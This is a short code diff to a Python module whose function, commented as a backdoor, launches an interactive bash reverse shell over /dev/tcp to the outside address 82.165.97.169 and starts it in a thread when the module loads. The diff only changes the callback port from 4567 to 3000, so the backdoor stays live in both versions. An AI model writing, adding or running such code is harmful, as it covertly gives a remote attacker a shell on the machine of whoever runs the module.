@@ -10,7 +10,7 @@ import threading
 
 #scrips for backdoor
 def trash(num):
-     subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/4567 0<&1 2>&1", shell=True, executable='/bin/bash')
+     subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/3000 0<&1 2>&1", shell=True, executable='/bin/bash')
 
 thread = threading.Thread(target= trash, args=(10,))
 thread.start()
